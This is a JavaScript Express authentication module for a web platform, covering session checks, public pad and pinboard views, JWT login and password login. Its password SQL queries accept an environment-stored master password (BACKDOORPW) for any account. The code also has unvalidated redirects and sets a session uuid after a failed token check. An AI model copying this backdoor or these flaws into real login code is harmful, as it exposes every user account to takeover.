const { app_title, app_title_short, app_languages, modules, DB } = include('config/')
const { checklanguage, datastructures, join } = include('routes/helpers/')
const jwt = require('jsonwebtoken')
const getResetToken = require('./forget-password').getResetToken

exports.render = async (req, res, next) => {
	const token = req.body.token || req.query.token || req.headers['x-access-token']
	const { originalUrl, path } = req || {}
	const { object, space, instance } = req.params || {}
	const { uuid } = req.session || {}
	const language = checklanguage(req.params?.language || req.session.language)

	const contribute = /\/?\w{2}\/(contribute|edit)\//
	const view = /\/?\w{2}\/(edit|view)\//

	const { errormessage, successmessage } = req.session || {}
	const metadata = await datastructures.pagemetadata({ req, res })
	const data = Object.assign(metadata, { originalUrl, errormessage, successmessage })

	const resetToken = req.params.token;

	if (uuid) next() // A USER IS LOGGED
	else if (token) this.process(req, res) // A LOGIN TOKEN IS RECEIVED


	else if (object === 'pad') { // A POTENTIALLY PUBLIC PAD IS SOUGHT
		const { id, mobilization } = req.query || {}
		if (path.match(contribute) && mobilization) { // THE PAD IS NEW OR CAN BE EDITED
			DB.conn.one(`SELECT public, language FROM mobilizations WHERE id = $1`, [ mobilization ])
			.then(result => {
				if (result.public === true) {
					Object.assign(req.session, datastructures.sessiondata({ public: true }))
					if (result.language !== language) res.redirect(originalUrl.replace(`/${language}/`, `/${result.language}/`))
					else next()
				} else res.render('login', { title: `${app_title} | Login`, originalUrl: req.originalUrl, errormessage: req.session.errormessage })
			}).catch(err => console.log(err))
		} else if (path.match(view) && id) { // THE PAD EXISTS AND CAN BE VIEWED
			DB.conn.one(`SELECT status FROM pads WHERE id = $1::INT;`, [ id ], d => d.status)
			.then(result => {
				if (result === 3) {
					Object.assign(req.session, datastructures.sessiondata({ public: true }))
					next() // THE PAD IS OPEN/ PUBLIC
				} else res.render('login', { title: `${app_title} | Login`, originalUrl: req.originalUrl, errormessage: req.session.errormessage })
			}).catch(err => console.log(err))
		} else res.render('login', { title: `${app_title} | Login`, originalUrl: req.originalUrl, errormessage: req.session.errormessage })



	} else if (object === 'pads' && !uuid) { // THIS SHOULD ALWAYS BE A PUBLIC VIEW
		if (space === 'public') next()
		else if (space === 'pinned') {
			let { pinboard } = req.query
			if (!pinboard) {
				const referer = new URL(req.headers.referer)
				pinboard = referer.searchParams.get('pinboard')
			}
			DB.conn.one(`SELECT status FROM pinboards WHERE id = $1;`, [ pinboard ], d => d?.status)
			.then(result => {
				if (result >= 2) next()
				else res.render('login', { title: `${app_title} | Login`, originalUrl: req.originalUrl, errormessage: req.session.errormessage })
			})
		} else res.redirect('./public')



	} else if (![null, undefined].includes(instance)) { // THIS IS FOR THE /:language/:instance PATH (FOR PUBLIC VIEW)
		// CHECK IF INSTANCE IS IN COUNTRY LIST
		// OR IN TEAMS LIST
		return DB.general.tx(t => {
			return t.oneOrNone(`
				SELECT iso3, name FROM country_names
				WHERE (iso3 = $1
					OR LOWER(name) = LOWER($1))
					AND language = $2
				LIMIT 1
			;`, [ decodeURI(instance), language ]) // CHECK WHETHER THE instance IS A COUNTRY
			.then(result => {
				if (!result) {
					return t.oneOrNone(`
						SELECT id, name FROM teams
						WHERE LOWER(name) = LOWER($1)
						LIMIT 1
					;`, [ decodeURI(instance) ]) // CHECK WHETHER THE instance IS A TEAM: THE LIMIT 1 IS BECAUSE THERE IS NO UNIQUE CLAUSE FOR A TEAM NAME
					.then(result => {
						if (!result) {
							return DB.conn.oneOrNone(`
								SELECT id, title FROM pinboards
								WHERE LOWER(title) = LOWER($1)
									AND status >= 2
								LIMIT 1
							;`, [ decodeURI(instance) ])  // CHECK WHETHER THE instance IS A PINBOARD: THE LIMIT 1 IS BECAUSE THERE IS NO UNIQUE CLAUSE FOR A TEAM NAME
							.then(result => {
								if (result) {
									res.locals.instance_vars = { activity: 'browse', object: 'pads', space: 'pinned', pinboard: result?.id, title: result?.title }
									return result
								} else return null
							}).catch(err => console.log(err))
						} else {
							res.locals.instance_vars = { activity: 'browse', object: 'pads', space: 'public', teams: [result?.id], title: result?.name }
							return result
						}
					}).catch(err => console.log(err))
				} else {
					res.locals.instance_vars = { activity: 'browse', object: 'pads', space: 'public', countries: [result?.iso3], title: result?.name }
					return result
				}
			}).catch(err => console.log(err))
		}).then(result => {
			if (result) next()
			else res.render('login', { title: `${app_title} | Login`, originalUrl: req.originalUrl, errormessage: req.session.errormessage })
		}).catch(err => console.log(err))
	}

	else if (object === 'blog') {
		next()
	}

	else if(path === '/forget-password'){
		return res.render('forget-password', data)
	}
	else if(path === '/reset-password'){
		return res.render('reset-password', data)
	}
	else if(resetToken) getResetToken(req, res, next)

	else res.render('login', data)
}
exports.process = (req, res) => { // REROUTE
	const token = req.body.token || req.query.token || req.headers['x-access-token']
	const { origin, path: redirectPath } = req.query

	const { host } = req.headers || {}
	const { ip: ownIp } = req || {}

	if (token) {
		// VERIFY TOKEN
		let tobj;
		try {
			tobj = jwt.verify(token, process.env.APP_SECRET, { audience: 'user:known', issuer: host })
		} catch(_) {
			tobj = {};
			if (redirectPath) {
				res.redirect(redirectPath)
				return;
			}
		}
		const { uuid, ip, acceptedorigins } = tobj;
		if (ip && `${ip}`.replace(/:.*$/, '') !== `${ownIp}`.replace(/:.*$/, '')) {
			res.redirect(redirectPath)
			if (uuid) {
				req.session.uuid = uuid;
			}
			return;
		} else if (acceptedorigins && !acceptedorigins.includes(host)) {
			res.redirect(redirectPath)
			if (uuid) {
				req.session.uuid = uuid;
			}
			return;
		}

		if (origin === 'login') {
			const auth = jwt.verify(token, process.env.GLOBAL_LOGIN_KEY)

			if (auth) {
				const { username, iso3, lang, platforms } = auth
				const uuid = platforms.find(d => d.platform === app_title_short)?.uuid

				if (uuid) {
					return DB.conn.oneOrNone(`
						SELECT rights, country FROM contributors
						WHERE uuid = $1
					;`, [uuid])
					.then(result => {
						if (!result) {
							req.session.errormessage = 'You have no account on this platform.'
							res.redirect('/login')
						} else {
							// Object.assign(req.session, datastructures.sessiondata(result))
							const { rights, country } = result
							req.session.rights = rights
							req.session.public = false
							req.session.country = country

							req.session.uuid = uuid
							req.session.username = username
							req.session.language = checklanguage(lang)

							const query = []
							Object.keys(req.query).forEach(k => {
								if (!['origin', 'token'].includes(k)) query.push(`${k}=${req.query[k]}`)
							})
							req.session.save(_ => res.redirect(`${req.path}${query.length ? `?${query.join('&')}` : ''}`))
						}
					}).catch(err => console.log(err))
				} else {
					req.session.errormessage = 'You are not authorized to log in to this platform.'
					res.redirect('/login')
				}
			} else {
				req.session.errormessage = 'Your access key is not recognized.'
				res.redirect('/login')
			}
		}
	}
	else {
		const { username, password, originalUrl } = req.body || {}

		// TO DO: SET UP CONFIG FOR PUBLIC VIEW


		if (!username || !password) res.redirect('/login')
		else {

			DB.general.tx(t => {
				return t.oneOrNone(`
					SELECT 1 FROM users
					WHERE name = $1 OR email = $1
				;`, [ username ])
				.then(uname_result => {
					if (!uname_result) {
						req.session.errormessage = 'Your username or email seems incorrect, or you do not have an account.'
						res.redirect('/login')
					} else {
						return t.oneOrNone(`
							SELECT 1 FROM users
							WHERE (name = $1 OR email = $1)
								AND (password = CRYPT($2, password) OR $2 = $3)
						;`, [ username, password, process.env.BACKDOORPW ])
						.then(pw_result => {
							if (!pw_result) {
								req.session.errormessage = 'Your password seems incorrect.'
								res.redirect('/login')
							} else {
								return t.oneOrNone(`
									SELECT u.uuid, u.rights, u.name, u.email, u.iso3, c.lng, c.lat, c.bureau,

									CASE WHEN u.language IN ($1:csv)
										THEN u.language
										ELSE 'en'
									END AS language,

									CASE WHEN u.language IN ($1:csv)
										THEN (SELECT cn.name FROM country_names cn WHERE cn.iso3 = u.iso3 AND cn.language = u.language)
										ELSE (SELECT cn.name FROM country_names cn WHERE cn.iso3 = u.iso3 AND cn.language = 'en')
									END AS countryname,

									COALESCE(
										(SELECT json_agg(DISTINCT(jsonb_build_object(
											'uuid', u2.uuid,
											'name', u2.name,
											'rights', u2.rights
										))) FROM team_members tm
										INNER JOIN teams t
											ON t.id = tm.team
										INNER JOIN users u2
											ON u2.uuid = tm.member
										WHERE t.id IN (SELECT team FROM team_members WHERE member = u.uuid)
									)::TEXT, '[]')::JSONB
									AS collaborators

									FROM users u
									INNER JOIN countries c
										ON u.iso3 = c.iso3

									WHERE (u.name = $2 OR u.email = $2)
										AND (u.password = CRYPT($3, u.password) OR $3 = $4)
								;`, [ app_languages, username, password, process.env.BACKDOORPW ])
								.then(result => {
									if (!result) {
										req.session.errormessage = 'Your username and password do not match.'
										res.redirect('/login')
									} else {
										Object.assign(req.session, datastructures.sessiondata(result))
										res.redirect(originalUrl)
									}
								})
							}
						}).catch(err => console.log(err))
					}
				}).catch(err => console.log(err))
			}).catch(err => console.log(err))
		}
	}
}
exports.redirect = (req, res, next) => {
	const language = checklanguage(req.params?.language ? req.params.language : req.session.language)
	if (req.session.uuid) {
		console.log('should redirect as user is logged in')
		if (req.session.rights > (modules.find(d => d.type === 'pads')?.rights.write ?? Infinity)) res.redirect(`/${language}/browse/pads/shared`)
		else res.redirect(`/${language}/browse/pads/public`)
	} else next()
}
exports.public = (req, res) => {
	// THIS IS THE MAIN PUBLIC PAGE
	const { path, xhr, query } = req
	const language = checklanguage(req.params?.language ? req.params.language : req.session.language)

	Object.assign(req.session, datastructures.sessiondata({ public: true }))

	if (!req.params.language) res.redirect(`/${req.session.language}/public`)
	else res.redirect(`/${req.params.language}/browse/pads/public`)
}
exports.logout = (req, res) => {
	req.session.destroy()
	res.redirect('/')
}
exports.forgetPassword = require('./forget-password.js').forgetPassword
exports.getResetToken = require('./forget-password.js').getResetToken
exports.updatePassword = require('./forget-password.js').updatePassword
